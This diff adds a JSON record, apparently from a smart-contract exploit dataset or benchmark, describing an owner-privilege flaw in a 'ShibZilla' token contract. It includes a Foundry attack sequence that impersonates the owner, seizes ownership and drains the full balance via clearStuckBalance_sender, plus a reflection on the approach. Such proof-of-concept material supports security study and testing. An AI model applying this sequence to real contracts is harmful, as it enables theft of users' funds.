@@ -1,0 +1,6 @@
+{
+  "vulnerability_context": "The contract possesses an 'Active Owner Privileges' vulnerability. The owner has the unilateral power to drain the entire contract's native token balance by calling the `clearStuckBalance_sender` function. An attacker who compromises the owner's private key can transfer ownership to themselves and subsequently steal all funds.",
+  "interface_arsenal": "interface IShibZilla {\n    function getOwner() external view returns (address);\n    function transferOwnership(address payable adr) external;\n    function clearStuckBalance_sender(uint256 amountPercentage) external;\n}",
+  "attack_sequence": "address owner = shibZilla.getOwner();\n\nvm.startPrank(owner);\nshibZilla.transferOwnership(payable(address(this)));\nvm.stopPrank();\n\nshibZilla.clearStuckBalance_sender(100);",
+  "winning_reflection": "The core insight was recognizing that authorization to drain funds via `clearStuckBalance_sender` is directly tied to contract ownership. The exploit simulates a compromised owner key using `vm.prank` to execute a two-step attack: first, seize ownership by calling `transferOwnership`, and second, as the new owner, drain the contract's full balance."
+}
